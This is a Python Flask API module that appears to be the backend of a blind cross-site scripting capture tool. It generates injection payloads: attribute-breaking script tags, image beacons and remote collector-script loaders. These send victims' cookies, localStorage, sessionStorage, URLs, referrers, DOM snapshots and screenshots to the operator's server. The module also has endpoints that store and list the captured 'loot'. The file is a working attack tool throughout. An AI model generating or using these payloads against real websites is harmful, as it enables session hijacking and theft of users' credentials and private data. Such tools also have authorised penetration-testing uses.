import base64
import json
from typing import List

from app import db
from app.api.endpoints import bp
from app.api.utils.shared import generate_data_response, generate_message_response, permissions
from app.models import XSS, Client
from flask import jsonify, request
from flask_jwt_extended import jwt_required

PAYLOADS = {
    "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
    "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
    "session_storage": 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"',
    "origin_url": 'origin_url="+encodeURIComponent(location.href)+"',
    "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
}


@bp.route("/xss/generate", methods=["POST"])
@jwt_required()
def generate_xss_payload():

    request_body = request.get_json()

    if "client_id" not in request_body.keys() or not request_body["client_id"]:
        return generate_message_response("Missing client ID", 400)

    if "url" not in request_body.keys() or not request_body["url"]:
        return generate_message_response("Missing URL", 400)

    if "xss_type" not in request_body.keys() or not request_body["xss_type"]:
        return generate_message_response("Missing XSS type", 400)

    if "code_type" not in request_body.keys() or not request_body["code_type"]:
        return generate_message_response("Missing code type", 400)

    if "data_to_gather" not in request_body.keys():
        return generate_message_response("Missing list of data to gather", 400)

    if "tags" not in request_body.keys():
        return generate_message_response("Missing tags", 400)

    client = Client.query.filter_by(id=request_body["client_id"]).first_or_404()

    if request_body["code_type"] == "html":
        payload = generate_html_payload(request_body["data_to_gather"], request_body["tags"], request_body["url"], request_body["xss_type"], client)

    else:
        payload = generate_javascript_payload(request_body["data_to_gather"], request_body["tags"], request_body["url"], request_body["xss_type"], client)

    return generate_message_response(payload)


def generate_html_payload(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    if "fingerprint" in data_to_gather or "dom" in data_to_gather or "screenshot" in data_to_gather:
        return generate_html_payload_with_complex_data(data_to_gather, tag_list, url, xss_type, client)

    elif (
        "local_storage" in data_to_gather
        or "session_storage" in data_to_gather
        or "cookies" in data_to_gather
        or "origin_url" in data_to_gather
        or "referrer" in data_to_gather
    ):
        return generate_html_payload_with_simple_data(data_to_gather, tag_list, url, xss_type, client)

    else:
        return generate_html_payload_without_data(tag_list, url, xss_type, client)


def generate_html_payload_with_complex_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
    payload_start = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
    payload_mid = base64.b64encode(
        str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "data_to_gather": data_to_gather, "tags": tag_list}))
    ).decode()
    payload_end = '")</script>'
    payload = payload_start + payload_mid + payload_end
    return payload


def generate_html_payload_with_simple_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    tags = ",".join(tag_list)

    payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'

    payload_tags = f"tags={tags}" if tags else ""
    payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in data_to_gather]).rstrip('+"')

    payload_mid = "&".join([payload_tags, payload_to_gather]) if payload_tags else payload_to_gather
    payload_end = "</script>"
    payload = payload_start + payload_mid + payload_end
    return payload


def generate_html_payload_without_data(tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    tags = ",".join(tag_list)

    payload_start = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
    payload_tags = f"tags={tags}" if tags else ""
    payload_start = f"{payload_start}?{payload_tags}" if payload_tags else payload_start
    payload_end = '" />'
    payload = payload_start + payload_end
    return payload


def generate_javascript_payload(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    if "fingerprint" in data_to_gather or "dom" in data_to_gather or "screenshot" in data_to_gather:
        return generate_javascript_payload_with_complex_data(data_to_gather, tag_list, url, xss_type, client)

    else:
        return generate_javascript_payload_with_simple_data(data_to_gather, tag_list, url, xss_type, client)


def generate_javascript_payload_with_complex_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:
    payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
    payload_mid = base64.b64encode(
        str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "data_to_gather": data_to_gather, "tags": tag_list}))
    ).decode()

    payload_end = '")};document.body.appendChild(js);'
    payload = payload_start + payload_mid + payload_end
    return payload


def generate_javascript_payload_with_simple_data(data_to_gather: List[str], tag_list: List[str], url: str, xss_type: str, client: Client) -> str:

    tags = ",".join(tag_list)

    payload_start = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}"'

    payload_tags = f"tags={tags}" if tags else ""
    payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in data_to_gather]).rstrip('+"')

    payload_start = f"""{payload_start.rstrip('"')}?""" if payload_tags or payload_to_gather else payload_start

    payload_mid = ""
    if payload_tags and payload_to_gather:
        payload_mid = "&".join([payload_tags, payload_to_gather])
    elif payload_tags:
        payload_mid = payload_tags
    elif payload_to_gather:
        payload_mid = payload_to_gather

    payload_end = ";"
    payload = payload_start + payload_mid + payload_end
    return payload


@bp.route("/xss/<int:xss_id>", methods=["GET"])
@jwt_required()
def client_xss_get(xss_id):
    """Gets a single XSS instance"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    return jsonify(xss.to_dict()), 200


@bp.route("/xss/<int:xss_id>", methods=["DELETE"])
@jwt_required()
@permissions(one_of=["admin", "owner"])
def xss_delete(xss_id):
    """Deletes an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    db.session.delete(xss)
    db.session.commit()

    return jsonify({"status": "OK", "detail": "XSS deleted successfuly"}), 200


@bp.route("/xss/<int:xss_id>/data/<loot_type>", methods=["GET"])
@jwt_required()
def xss_loot_get(xss_id, loot_type):
    """Gets a specific type of data for an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    data = json.loads(xss.data)

    return jsonify({"data": data[loot_type]}), 200


@bp.route("/xss/<int:xss_id>/data/<loot_type>", methods=["DELETE"])
@jwt_required()
@permissions(one_of=["admin", "owner"])
def xss_loot_delete(xss_id, loot_type):
    """Deletes a specific type of data for an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    data = json.loads(xss.data)

    data.pop(loot_type, None)

    xss.data = json.dumps(data)

    db.session.commit()

    return jsonify({"status": "OK", "detail": "Data deleted successfuly"}), 200


@bp.route("/xss", methods=["GET"])
@jwt_required()
def client_xss_all_get():
    """Gets all XSS based on a filter"""

    filter_expression = {}
    parameters = request.args.to_dict()

    if "client_id" in parameters:
        if not parameters["client_id"].isnumeric():
            return jsonify({"status": "error", "detail": "Bad client ID"}), 400
        filter_expression["client_id"] = parameters["client_id"]
    if "type" in parameters:
        if parameters["type"] != "reflected" and parameters["type"] != "stored":
            return jsonify({"status": "error", "detail": "Unknown XSS type"}), 400
        filter_expression["xss_type"] = parameters["type"]

    xss_list = []
    xss = XSS.query.filter_by(**filter_expression).all()

    for hit in xss:
        xss_list.append(hit.to_dict_short())

    return jsonify(xss_list), 200


@bp.route("/xss/data", methods=["GET"])
@jwt_required()
def client_loot_get():
    """Get all captured data based on a filter"""
    loot = []

    filter_expression = {}
    parameters = request.args.to_dict()

    if "client_id" in parameters:
        if not parameters["client_id"].isnumeric():
            return jsonify({"status": "error", "detail": "Bad client ID"}), 400
        filter_expression["client_id"] = parameters["client_id"]

    xss = XSS.query.filter_by(**filter_expression).all()

    for hit in xss:
        loot_entry = {"xss_id": hit.id, "tags": json.loads(hit.tags), "data": {}}
        for element_name, element_value in json.loads(hit.data).items():
            if element_name in ["fingerprint", "dom", "screenshot"]:
                loot_entry["data"].update({element_name: ""})
            else:
                loot_entry["data"].update({element_name: element_value})

        loot.append(loot_entry)

    return jsonify(loot), 200
